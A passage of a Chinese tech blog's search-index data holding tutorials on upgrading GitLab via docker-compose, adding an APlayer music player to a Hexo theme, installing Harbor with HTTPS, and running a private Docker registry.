删除Giblab容器（数据卷的数据默认不会被删除）# docker-compose down# 创建并启动Gitlab容器# docker-compose up -d 安装后更新、升级 Gitlab 123456789101112131415161718# 进入配置文件docker-compose.yml所在的目录# cd /usr/local/gitlab# 停止Giblab容器# docker-compose stop# 在配置文件docker-compose.yml中指定Gitlab新的版本号，或者直接指定最新的版本，即“gitlab/gitlab-ce:latest”# vim docker-compose.ymlweb: image: 'gitlab/gitlab-ce:latest' restart: always ....（省略）# 拉取最新的Gitlab镜像# docker-compose pull# 创建并启动Gitlab容器# docker-compose up -d 注意事项 为了以后方便更新 Gitlab 镜像，同时更好地处理更新镜像带来的向前兼容问题，建议首次安装或者更新 Gitlab 的时候，直接指定具体需要安装的版本号，而不是直接使用 latest 版本号。Gitlab-CE 的版本号可以从这里获取。 123456# 在配置文件docker-compose.yml中指定Gitlab的版本号# vim /usr/local/gitlab/docker-compose.ymlweb: image: 'gitlab/gitlab-ce:11.7.5-ce.0' restart: always ....（省略） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"容器化 版本控制"},{title:"Hexo 全局添加 APlayer 音乐播放器",url:"/posts/cfdad023.html",text:"相关站点 APlayer 官网 APlayer Github Hexo-Tag-Aplayer 音乐直链搜索工具 基于 Yilia 主题全局添加 APlayer 音乐播放器 编辑 Yilia 的模版文件 hexo-theme-yilia/layout/_partial/left-col.ejs，在文件的末尾追加以下代码，其中歌曲的歌词文件、封面图片、URL 都可以从通过音乐直链搜索工具获取，也可以直接使用服务器本地资源文件。值得一提的是，如果下面的代码不能将 APlayer 播放器固定到理想的页面位置，可自行修改 div 标签的样式和 APlayer 的 fixed 参数值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;% if(theme.aplayer.enable) { %&gt;&lt;link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css\"&gt;// 这里div的样式是笔者自己修改过的，你可以直接使用APlayer官方的原配置：&lt;div id=\"aplayer\"&gt;&lt;/div&gt;&lt;div id=\"aplayer\" style=\"position:absolute;left;0;bottom:0;\"&gt;&lt;/div&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js\"&gt;&lt;/script&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/color-thief-don@2.0.2/src/color-thief.js\"&gt;&lt;/script&gt;&lt;script&gt; const ap = new APlayer({ container: document.getElementById('aplayer'), autoplay: false, //自动播放 listFolded: true, //播放列表默认折叠 listMaxHeight: 90, //播放列表最大高度 order: 'list', //音频循环顺序, 可选值: 'list', 'random' loop: 'all', //音频循环播放, 可选值: 'all', 'one', 'none' theme: '#e9e9e9', //切换音频时的主题色，优先级低于audio.theme preload: 'none', //音频预加载，可选值: 'none', 'metadata', 'auto' mutex: true, //互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器 lrcType: 3, //歌词格式，可选值：3（LRC文件歌词格式），1（JS字符串歌词格式） volume: 0.7, //默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效 fixed: false, //吸底模式（fixed:true），迷你模式（mini:true），普通模式（注释此行或者设置fixed:false） audio: [{ name: '平凡之路', artist: '朴树', lrc: '/downloads/lrc/平凡之路-朴树.lrc', cover: 'http://p2.music.126.net/W_5XiCv3rGS1-J7EXpHSCQ==/18885211718782327.jpg?param=300x300', url: 'http://fs.open.kugou.com/cd5cbe8edb012e4f77b0857cefc0956e/5c66accf/G097/M08/0A/1F/AYcBAFkQGpOAMUpuAEm-3SlWMyk951.mp3' }, { name: '后会无期', artist: 'G.E.M.邓紫棋', lrc: '/downloads/lrc/后会无期-G.E.M.邓紫棋.lrc', cover: 'http://p1.music.126.net/vpvPajo3kn88nHc7jUjeWQ==/5974746185758035.jpg?param=300x300', url: 'http://m10.music.126.net/20190215193113/e5afc8b5376136029366f2053cf30f85/ymusic/2c87/6ec3/582e/0d572dcc04f8de34133c0f364b74c30c.mp3' } ] }); //实现切换音频时，根据音频的封面图片自适应主题色 const colorThief = new ColorThief(); const setTheme = (index) =&gt; { if (!ap.list.audios[index].theme) { colorThief.getColorAsync(ap.list.audios[index].cover, function(color) { ap.theme(`rgb(${color[0]}, ${color[1]}, ${color[2]})`, index); }); } }; setTheme(ap.list.index); ap.on('listswitch', (data) =&gt; { setTheme(data.index); });&lt;/script&gt;&lt;% } %&gt; (adsbygoogle = window.adsbygoogle || []).push({}); 配置 Yilia 主题 编辑 Yilia 主题的配置文件 hexo-theme-yilia/_config.yml，在文件末尾追加以下内容。 12aplayer: enable: true 重新构建博客 提示，若音频文件使用的是本地资源文件，同时通过 hexo server 提供 Web 服务，那么将无法通过 APlayer 的进度条调节播放进度，此时需要使用 Nginx、Apache 等 Web 服务器。 1234567891011# 进入博客的根目录$ cd /blogroot# 通过Hexo清理Public目录$ hexo clean# 通过Hexo构建静态文件$ hexo generate# 通过Hexo启动服务$ hexo server 扩展建议 若希望日后方便地添加或删除歌曲，建议将歌曲信息写在单独的 Json 文件中，JavaScript 代码初始化 APlayer 音乐播放器时动态读取 Json 文件，那么日后只需要编辑歌曲的 Json 文件就可以达到动态更新歌曲列表目的，本站的音乐播放器使用了该方法。 页面切换后音频播放中断 当博客的 Web 页面切换后，音频播放会中断，建议使用 Pjax 来解决，这是下方评论区网友给出的方案，暂时未亲测。 最终效果图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"静态博客"},{title:"Docker 之十六搭建私有仓库管理系统 Harbor",url:"/posts/99d575a6.html",text:'相关站点 Harbor 官网 Harbor Docs Harbor Github Harbor Releases Harbor 介绍 Harbor 是 VMware 公司开源的一个用于存储和分发 Docker 镜像的企业级 Registry 服务器，以 Docker 开源的 Registry 为基础，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源 Docker Distribution。作为一个企业级私有 Registry 服务器，Harbor 提供了更好的性能和安全，提升用户使用 Registry 构建和运行环境传输镜像的效率。Harbor 支持安装在多个 Registry 节点的镜像资源复制，镜像全部保存在私有 Registry 中，确保数据和知识产权在公司内部网络中管控。另外，Harbor 也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。 Harbor 特性 基于角色的访问控制（Role Based Access Control） 基于策略的镜像复制（Policy based image replication） 镜像的漏洞扫描（Vulnerability Scanning） AD/LDAP 集成（LDAP/AD support） 镜像的删除和空间清理（Image deletion &amp; garbage collection） 友好的管理 UI（Graphical user portal） 审计日志（Audit logging） RESTful API 部署简单（Easy deployment） Harbor 组件 依赖的外部组件: Nginx（Proxy）: Harbor 的 Registry、UI、Token 等服务，通过一个前置的反向代理统一接收浏览器、Docker 客户端的请求，并将请求转发给后端不同的服务。 Registry v2: Docker 官方镜像仓库，负责储存 Docker 镜像，并处理 Docker Push/Pull 命令。由于我们要对用户进行访问控制，即不同用户对 Docker 镜像有不同的读写权限，Registry 会指向一个 Token 服务，强制用户的每次 Docker Push/Pull 请求都要携带一个合法的 Token, Registry 会通过公钥对 Token 进行解密验证。 Database（MySQL/Postgresql）：为 Core Services 提供数据库服务，负责储存用户权限、审计日志、Docker 镜像分组信息等数据。 Harbor 自己的组件: Core Services（Admin Server）: 这是 Harbor 的核心功能，主要提供以下服务： API：提供 Harbor RESTful API UI：提供图形化界面，帮助用户管理 Registry 上的镜像，并对用户进行授权。 Webhook：为了及时获取 Registry 上镜像状态变化的情况，在 Registry 上配置 Webhook，把状态变化传递给 UI 模块。 Auth 服务：负责根据用户权限给每个 Docker Push/Pull 命令签发 Token。Docker 客户端向 Registry 服务发起的请求，如果不包含 Token，会被重定向到这里，获得 Token 后再重新向 Registry 进行请求。 Replication Job Service：提供多个 Harbor 实例之间的镜像同步功能。 Log Collector：为了帮助监控 Harbor 运行，负责收集其他组件的日志，供日后进行分析。 Harbor 架构图 Harbor 安裝方式 不建议使用 Kubernetes 来安裝，原因是镜像仓库非常重要，尽量保证安裝和维护的简洁性，因此这里直接使用 Docker Compose 的方式进行安裝。事实上 Harbor 的每个组件都是以 Docker 容器的形式构建，官方也是使用 Docker Compose 来对它进行安裝。Harbor 官方提供以下三种安裝方式: 在线安装：从 Docker Hub 下载 Harbor 的镜像来安装，由于 Docker Hub 比较慢，建议 Docker 配置好加速器。 离线安装：这种方式应对与安裝主机没联网的情况使用，需要提前下载离线安装包到本地。 OVA 安装：这个主要用 vCentor 环境时使用。 Harbor 安装环境说明 Harbor 以容器的形式进行安装，因此可以被安装到任何支持 Docker 的 Linux 发行版，本教程的安装环境如下： 环境名称 版本 linux 发行版 CentOS Linux release 7.6.1810 (Core) docker-ce 18.09.0 docker-compose 1.24.0-rc1 harbor 1.7.1 harbor 安装方式 在线安装 harbor 安装位置 /usr/local/harbor 安装 Docker 站内教程：Docker 之一 Docker 介绍与安装 安装 Docker-Compose 站内教程：Docker 之十七 Docker-Compose 安装与使用 安装 Harbor Harbor 的在线或者离线安装程序下载地址可以从这里获取，如果下载失败，请自备梯子。 1234567891011121314151617181920212223242526272829303132333435# 安装方式分为在线安装和离线安装两种方式，这里采用在线安装方式# 下载在线安装程序# wget -P /usr/local https://storage.googleapis.com/harbor-releases/release-1.7.0/harbor-online-installer-v1.7.1.tgz# 解压下载文件# tar zxf /usr/local/harbor-online-installer-v1.7.1.tgz -C /usr/local/# 修改配置文件，根据自己的需求进行修改# vim /usr/local/harbor/harbor.cfg# 本机IP或者域名，不能是127.0.0.1或者localhosthostname = 192.168.1.130# 系统Harbor管理员的密码harbor_admin_password = Harbor12345# 禁止用户注册self_registration = off# 设置只有管理员可以创建项目project_creation_restriction = adminonly# 由于Harbor的Nginx组件默认会监听宿主机的80、443、4443端口，如果需要更改Nginx的端口映射，可以修改以下配置文件# vim /usr/local/harbor/docker-compose.yml ports: - 8082:80 - 443:443 - 4443:4443# 如果上面更改了Nginx的80端口映射，此时还需要编辑Harbor的配置文件，修改hostname加上指定的端口号# vim harbor.cfghostname = 192.168.1.130:8082# 执行安装脚本# /usr/local/harbor/install.sh# Harbar的日志目录是：/var/log/harbor# Harbar相关数据卷的挂载目录默认是宿主机的/data目录，如果重新安装Harbar并在配置文件里更改了数据库密码，则需要删除/data目录，否则Harbor部分组件会启动失败 安装 Harbor 的日志信息 ★查看详细日志信息★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135[Step 0]: checking installation environment ...Note: docker version: 18.09.0Note: docker-compose version: 1.24.0[Step 1]: preparing environment ...Generated and saved secret to file: /data/secretkeyGenerated configuration file: ./common/config/nginx/nginx.confGenerated configuration file: ./common/config/adminserver/envGenerated configuration file: ./common/config/core/envGenerated configuration file: ./common/config/registry/config.ymlGenerated configuration file: ./common/config/db/envGenerated configuration file: ./common/config/jobservice/envGenerated configuration file: ./common/config/jobservice/config.ymlGenerated configuration file: ./common/config/log/logrotate.confGenerated configuration file: ./common/config/registryctl/envGenerated configuration file: ./common/config/core/app.confGenerated certificate, key file: ./common/config/core/private_key.pem, cert file: ./common/config/registry/root.crtThe configuration files are ready, please use docker-compose to start the service.[Step 2]: checking existing instance of Harbor ...[Step 3]: starting Harbor ...Creating network "harbor_harbor" with the default driverPulling log (goharbor/harbor-log:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-log321a8da5ee1f: Pull completee58cb02d4a79: Pull completeb1addcae27cf: Pull complete0add5fe71c61: Pull complete701d7cb4751e: Pull completeae052802ba8f: Pull complete474572a6c946: Pull completeDigest: sha256:1465ec82b77534eb4687093fff91c752ac655d4ed1fb7e7b23bb6e3905a1ef18Status: Downloaded newer image for goharbor/harbor-log:v1.7.1Pulling registry (goharbor/registry-photon:v2.6.2-v1.7.1)...v2.6.2-v1.7.1: Pulling from goharbor/registry-photon321a8da5ee1f: Already exists427e471dc5bb: Pull complete79d644c380a9: Pull completed1ee69ba441f: Pull complete13ee399ae5e6: Pull complete52da6cf3d71f: Pull completee6dfe8d3336d: Pull complete2261e5dd4591: Pull completeDigest: sha256:dccc66572458001ed3b8f8ead0f0a89f0455747992528bafb857ed031bae07dcStatus: Downloaded newer image for goharbor/registry-photon:v2.6.2-v1.7.1Pulling registryctl (goharbor/harbor-registryctl:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-registryctl321a8da5ee1f: Already exists60ab2a220157: Pull complete685cb36a4aa6: Pull complete6ab9cbb7c05b: Pull completed66f51b51c32: Pull complete152d893b8817: Pull completeDigest: sha256:de4b9c6684b7005379df6c48c05d2884c6b3cced0c98f8814c4506d71f781b9cStatus: Downloaded newer image for goharbor/harbor-registryctl:v1.7.1Pulling postgresql (goharbor/harbor-db:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-db321a8da5ee1f: Already exists3b62caa7690c: Pull complete0c0b8f8af809: Pull complete68db7c777555: Pull complete810390407c8c: Pull completed99f5e0b551e: Pull complete0dedd5da1f5d: Pull complete5e156cfb841f: Pull complete0433d5b9e1ad: Pull completeDigest: sha256:6031b1ed9337c3af78e627ecd45351e0e0d630b83cf45e1c924cb3e5b006cb44Status: Downloaded newer image for goharbor/harbor-db:v1.7.1Pulling adminserver (goharbor/harbor-adminserver:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-adminserver321a8da5ee1f: Already exists3235adc5dfba: Pull complete36df358268ae: Pull completef07cf44733c3: Pull complete153223fc88f2: Pull completeDigest: sha256:5a539a2c733ca9efcd62d4561b36ea93d55436c5a86825b8e43ce8303a7a0752Status: Downloaded newer image for goharbor/harbor-adminserver:v1.7.1Pulling core (goharbor/harbor-core:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-core321a8da5ee1f: Already exists95d433145bab: Pull complete49d3e2a9635a: Pull complete6a4cbc768efe: Pull complete7e7d30cebeb5: Pull completeDigest: sha256:2791572f21aeaa7e62d3ee90b5b7ced3903633d9809d19fa32d3a524d580fc12Status: Downloaded newer image for goharbor/harbor-core:v1.7.1Pulling portal (goharbor/harbor-portal:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-portal321a8da5ee1f: Already exists0c2edbea17ee: Pull complete35f0e6ee2803: Pull complete815b36cabaa4: Pull completeDigest: sha256:37a16e2ab4dc1499b25ce4a3f42c34a3c524fcfcd31f7433a459a738d4cec3b6Status: Downloaded newer image for goharbor/harbor-portal:v1.7.1Pulling redis (goharbor/redis-photon:v1.7.1)...v1.7.1: Pulling from goharbor/redis-photon321a8da5ee1f: Already existse37a237fdce1: Pull completea533db83c439: Pull complete60f1956f70fa: Pull completec7eecf8b746b: Pull completeDigest: sha256:9a10e8d0c3640c0207d94409fc61783643a2f5d866d4e1136c0718b3a5ac3015Status: Downloaded newer image for goharbor/redis-photon:v1.7.1Pulling jobservice (goharbor/harbor-jobservice:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-jobservice321a8da5ee1f: Already exists4809bd624b7e: Pull complete889c696c8f56: Pull complete72d181b0302b: Pull completeDigest: sha256:c6706d51a3476235d8e801806141aa8e7279608268fca8be8ccd2e74987db093Status: Downloaded newer image for goharbor/harbor-jobservice:v1.7.1Pulling proxy (goharbor/nginx-photon:v1.7.1)...v1.7.1: Pulling from goharbor/nginx-photon321a8da5ee1f: Already exists044755eb163c: Pull completeDigest: sha256:c941c386eb99613b4c7481b9e433372bfac07beddb52a4e73dd7356ac8373189Status: Downloaded newer image for goharbor/nginx-photon:v1.7.1Creating harbor-log ... doneCreating harbor-adminserver ... doneCreating registryctl ... doneCreating harbor-db ... doneCreating registry ... doneCreating redis ... doneCreating harbor-core ... doneCreating harbor-portal ... doneCreating harbor-jobservice ... doneCreating nginx ... done✔ ----Harbor has been installed and started successfully.----Now you should be able to visit the admin portal at http://192.168.1.130.For more details, please visit https://github.com/goharbor/harbor . Harbor启动/停止/重启 1234567891011121314151617181920212223242526272829303132333435363738# 如果某个Harbor组件启动失败，可以在日志目录/var/log/harbor下查看具体的日志信息，进一步定位启动失败的原因# 启动时Harbor默认会监听宿主机的80、443、4443端口，启动Harbor之前必须确保宿主机的80、443、4443端口不被占用，否则Harbor相关组件会启动失败。# 查看Harbor容器的运行状态# docker ps# 或者通过docker-compose查看，此时需要进入Harbor安装脚本所在的目录里执行相关命令# cd /usr/local/harbor# 查看Harbor容器的运行状态# docker-compose ps Name Command State Ports-------------------------------------------------------------------------------------------------------------------------------------harbor-adminserver /harbor/start.sh Up (healthy)harbor-core /harbor/start.sh Up (healthy)harbor-db /entrypoint.sh postgres Up (healthy) 5432/tcpharbor-jobservice /harbor/start.sh Upharbor-log /bin/sh -c /usr/local/bin/ ... Up (healthy) 127.0.0.1:1514-&gt;10514/tcpharbor-portal nginx -g daemon off; Up (healthy) 80/tcpnginx nginx -g daemon off; Up (healthy) 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:4443-&gt;4443/tcp, 0.0.0.0:80-&gt;80/tcpredis docker-entrypoint.sh redis ... Up 6379/tcpregistry /entrypoint.sh /etc/regist ... Up (healthy) 5000/tcpregistryctl /harbor/start.sh Up (healthy)# 启动Harbor容器# docker-compose start# 停止Harbor容器# docker-compose stop# 重启Harbor容器# docker-compose restart# 停止并删除Harbor容器，加上-v参数可以同时移除挂载在容器上的目录# docker-compose down# 创建并启动Harbo容器，参数“-d”表示后台运行命令# docker-compose up -d Harbor测试访问 浏览器输入以下地址或者域名访问Harbor的Web界面，默认账号密码：admin/Harbor12345http://192.168.1.130 将本地镜像Push到Harbor 12345678910111213141516171819202122232425262728293031# 配置Docker客户端允许使用Http协议，如果Nginx更改了的端口映射，需要在以下IP地址后面指定具体的端口号# vim /etc/docker/daemon.json{ "insecure-registries":["192.168.1.130"]}# 重新加载Docker的配置文件# systemctl daemon-reload# 重启Docker# systemctl restart docker# 拉取Docker官方的Centos镜像# docker pull centos:latest# 查看镜像列表# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 1e1148e4cc2c 7 weeks ago 202MB....# 登录Harbor Registry，回车后输入admin用户的帐号信息（admin/Harbor12345）# docker login 192.168.1.130# 如果不使用默认项目名library，则需要使用admin用户提前登录Harbor的Web界面，手动创建新项目后再进行Push操作# 给镜像打上相应的标签, 注意标签格式: ip/{project-name}/{image-name}[:tag]# 项目library只有admin有写的权限# docker tag centos:latest 192.168.1.130/library/centos:1.0# 将本地镜像Push到Harbor# docker push 192.168.1.130/library/centos:1.0 将Harbor镜像Pull到本地 123456789# 删除上面创建的镜像# docker rmi centos# docker rm 192.168.1.130/library/centos:1.0# 将Harbor镜像Pull到本地# docker pull 192.168.1.130/library/centos:1.0# 查看镜像列表# docker ps Harbor安装后更改Nginx的端口映射 1234567891011121314151617181920212223242526272829303132333435# 进入Harbor的安装目录# cd /usr/local/harbor# 停止并删除Harbor容器，加上-v参数可以同时移除挂载在容器上的目录# docker-compose down# 编辑compose的配置文件，修改Nginx的80端口映射# vim docker-compose.yml ports: - 8082:80 - 443:443 - 4443:4443# 编辑Harbor的配置文件，修改hostname加上指定的端口号# vim harbor.cfghostname = 192.168.1.130:8082# 重新生成配置文件# prepare# 创建并启动Harbor容器# docker-compose up -d# 查看Harbor的容器列表，发现Nginx的端口映射已经更改成功# docker-compose psharbor-adminserver /harbor/start.sh Up (health: starting)harbor-core /harbor/start.sh Up (health: starting)harbor-db /entrypoint.sh postgres Up (health: starting) 5432/tcpharbor-jobservice /harbor/start.sh Upharbor-log /bin/sh -c /usr/local/bin/ ... Up (healthy) 127.0.0.1:1514-&gt;10514/tcpharbor-portal nginx -g daemon off; Up (health: starting) 80/tcpnginx nginx -g daemon off; Up (health: starting) 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:4443-&gt;4443/tcp, 0.0.0.0:8082-&gt;80/tcpredis docker-entrypoint.sh redis ... Up 6379/tcpregistry /entrypoint.sh /etc/regist ... Up (health: starting) 5000/tcpregistryctl /harbor/start.sh Up (health: starting) 生成TLS证书，用于Harbor配置Https 12345678910111213141516171819202122232425262728293031323334353637# 下面以IP：192.168.1.130为例子，实际操作中将命令中的IP地址修改为自己的IP地址即可# 创建存放证书的临时目录# mkdir ~/cert# cd ~/cert# 创建自签名根证书# openssl req \\ -newkey rsa:4096 -nodes -sha256 -keyout ca.key \\ -x509 -days 10000 -out ca.crt \\ -subj "/C=CN/ST=Guangdong/L=Shenzhen/O=test_company/OU=IT/CN=test/emailAddress=test@qq.com"# lsca.crt ca.key# 产生证书签名请求# openssl req \\ -newkey rsa:4096 -nodes -sha256 -keyout harbor-registry.key \\ -out harbor-registry.csr \\ -subj "/C=CN/ST=Guangdong/L=Shenzhen/O=test_company/OU=IT/CN=192.168.1.130/emailAddress=test@qq.com"# lsca.crt ca.key harbor-registry.csr harbor-registry.key# 为Registry主机产生证书# echo subjectAltName = IP:192.168.1.130 &gt; extfile.cnf# openssl x509 -req -days 10000 -in harbor-registry.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile extfile.cnf -out harbor-registry.crt# lsca.crt ca.key ca.srl extfile.cnf harbor-registry.crt harbor-registry.csr harbor-registry.key# 创建Harbor的证书目录# mkdir -p /opt/cert# 拷贝harbor-registry证书到Harbor的证书目录# cp harbor-registry.crt /opt/cert/# cp harbor-registry.key /opt/cert/ Harbor安装后配置Https 1234567891011121314151617181920212223242526272829# 进入Harbor的安装目录# cd /usr/local/harbor# 停止并删除Harbor容器，加上-v参数可以同时移除挂载在容器上的目录# docker-compose down# 修改harbor.cfg配置文件# vim /usr/local/harbor/harbor.cfgui_url_protocol = httpshostname = 192.168.1.130ssl_cert = /opt/cert/harbor-registry.crtssl_cert_key = /opt/cert/harbor-registry.key# 重新生成配置文件# ./prepare# 让Docker客户端默认使用Https协议访问Registry，需要去掉“insecure-registries”相关配置项# 查看daemon.json文件中是否有"insecure-registries":["192.168.1.130"]，如果有则将其删除掉# vim /etc/docker/daemon.json{"insecure-registries":[""]}# 重新加载Docker的配置文件# systemctl daemon-reload# 重启Docker# systemctl restart docker# 创建并启动Harbor容器# docker-compose up -d 测试通过Https协议访问Harbor 通过浏览器访问这里首先需要将上面产生的~/cert/ca.crt导入到浏览器的受信任的根证书中，然后就可以通过Https协议访问Harbor的Web界面了，但不能保证所有浏览器都支持。访问地址是：https://192.168.1.130 通过Docker命令来访问 123456789101112131415161718192021222324252627# 创建Docker的证书目录，目录名称是IP地址，需要根据自己的情况进行修改# 特别注意，如果Nginx的443端口映射到了其他端口，以下命令中的目录名称都需要带上具体的Https端口号，例如 "mkdir -p /etc/docker/certs.d/192.168.1.130:8443"# mkdir -p /etc/docker/certs.d/192.168.1.130# 将上面产生的ca.crt拷贝到Docker的证书目录下# cp ~/cert/ca.crt /etc/docker/certs.d/192.168.1.130# 重启Docker# systemctl restart docker# 启动Harbor容器# docker-compose up -d# 登录Harbor Registry，回车后输入admin用户的帐号信息（admin/Harbor12345）# docker login 192.168.1.130# 查看镜像列表# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 1e1148e4cc2c 7 weeks ago 202MB....# 给本地镜像打上标签# docker tag centos:latest 192.168.1.130/library/centos:1.0# 将本地镜像Push到Harbor# docker push 192.168.1.130/library/centos:1.0 Harbor的坑 安装Harbor的时候，不要更改数据库默认密码，包括Postgresql、Redis，否则Harbor相关组件很有可能启动失败，导致Web界面显示”502 Gateway”错误 参考博客 搭建Harbor企业级docker仓库 Harbor安装后配置以支持Https var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之十五 Docker 私有仓库搭建与使用实战",url:"/posts/c76f5f00.html",text:'创建 Docker 私有仓库 12345# 下载Docker官方的registry镜像# docker pull registry# 创建并启动registry容器，添加5000端口映射和数据卷，其中/var/lib/registry目录是registry容器存放Docker镜像的位置# docker run -d -p 5000:5000 --name docker-registry --restart=always -v /container/registry:/var/lib/registry registry 查看私有仓库列表 1234567# 使用命令查看私有仓库列表，默认值为：{"repositories":[]}# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":["clay-tomcat"]}# 使用命令查看指定私有仓库的版本列表，clay-tomcat是私有仓库的名称# curl -X GET http://127.0.0.1:5000/v2/clay-tomcat/tags/list{"name":"clay-tomcat","tags":["1.0"]} Push 本地镜像到私有仓库 1234567891011121314151617# 首先下载Docker官方的Tomcat镜像# docker pull tomcat# 查看镜像列表# docker imagesEPOSITORY TAG IMAGE ID CREATED SIZEtomcat latest 7ee26c09afb3 3 days ago 462MB# 给Tomcat镜像添加一个带有私有仓库IP的TAG，其中7ee26c09afb3是Tomcat镜像的ID，clay-tomcat是私有仓库的名称，1.0是私有仓库中镜像的版本号（默认为latest）# docker tag 7ee26c09afb3 127.0.0.1:5000/clay-tomcat:1.0# 将Tomcat镜像Push到私有仓库# docker push 127.0.0.1:5000/clay-tomcat:1.0# 查看私有仓库列表# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":["clay-tomcat"]} Pull 私有仓库中的镜像到本地 123456789# 首先删除上面创建的TAG镜像与Docker官方的Tomcat镜像，因为本地不存在对应镜像层时Docker才会从私有仓库下载镜像# docker rmi tomcat# docker rmi 127.0.0.1:5000/clay-tomcat:1.0# 将私有仓库中的镜像Pull到本地，clay-tomcat是私有仓库的名称，1.0是私有仓库中镜像的版本号（默认为latest）# docker pull 127.0.0.1:5000/clay-tomcat:1.0# 使用刚Pull下来的Tomcat镜像，创建并启动Tomcat容器，可以通过浏览器测试访问Tomcat页面：http://127.0.0.1:8080/# docker run -d --name tomcat -p 8080:8080 127.0.0.1:5000/clay-tomcat:1.0 删除私有仓库中的镜像 Docker 官方不建议直接删除镜像的镜像层数据，所以没有接口直接删除镜像；删除镜像会很麻烦，一般如果删除某镜像只需删除该镜像的元数据，也就是 curl 命令查看到的镜像信息，而对于该镜像的镜像层数据需要进行垃圾回收才会真的被删除。如果删除的镜像与未删除的镜像公用了一些镜像层数据，垃圾回收之后再也用不了这些镜像了，因此删除元数据就好。 1234567891011121314151617# 官方推荐使用digest_hash参数删除私有仓库中的镜像数据，具体教程请自行网上搜索。# 连接Registry容器，docker-registry是容器名称，也可以使用容器ID# docker exec -it docker-registry /bin/sh# 删除对应镜像的所有版本，其中clay-tomcat是镜像名称# rm -rf /var/lib/registry/docker/registry/v2/repositories/clay-tomcat# 执行垃圾回收操作，注意2.4版本以上的registry才有此功能# docker exec registry bin/registry garbage-collect /etc/docker/registry/config.yml# 删除后需要重启Registry容器# docker restart docker-registry# 查看私有仓库列表# curl -X GET http://127.0.0.1:5000/v2/_catalog{"repositories":[]} 访问远程私有仓库 访问远程私有仓库之前，必须确认远程私有仓库所在服务器的防火墙开放了 Registry 端口（例如 5000）。 123456789101112131415161718192021222324# 查看远程私有仓库列表# curl -X GET http://192.168.1.130:5000/v2/_catalog# 由于Docker Registry默认采用Http协议，而Docker本地客户端默认需要使用Https协议执行Pull操作，因此如果Docker本地客户端直接从远程私有仓库中Pull镜像会提示以下错误信息Error response from daemon: Get https://192.168.1.130:5000/v2/: http: server gave HTTP response to HTTPS client# 配置Docker本地客户端允许使用Http协议，其中192.168.1.130:5000是远程私有仓库的IP和端口，配置内容必须符合JSON格式# vim /etc/docker/daemon.json{ "insecure-registries":["192.168.1.130:5000"]}# 重启Docker服务，使用配置生效# systemctl daemon-reload# systemctl restart docker# 从远程私有仓库Pull镜像到本地# docker pull 192.168.1.130:5000/clay-tomcat:1.0# 将本地镜像Push到远程私有仓库# docker pull hello-world# docker tag fce289e99eb9 192.168.1.130:5000/hello-world：1.0# docker push 192.168.1.130:5000/hello-world：1.0# curl -X GET http://192.168.1.130:5000/v2/_catalog 创建带身份验证的 Docker 私有仓库 12345678910111213141516171819202122232425262728293031# 下载Docker官方的registry镜像# docker pull registry# 创建保存私有仓库帐号信息的目录# mkdir -p /etc/docker/registry-auth# 为clay用户名生成一条密码为123456的用户信息，并保存在文件/etc/docker/registry-auth/htpasswd，其中registry:latest表示使用registry镜像的latest版本# docker run --entrypoint htpasswd registry:latest -Bbn clay 123456 &gt;&gt; /etc/docker/registry-auth/htpasswd# 用户密码默认会加密保存到本地磁盘# cat 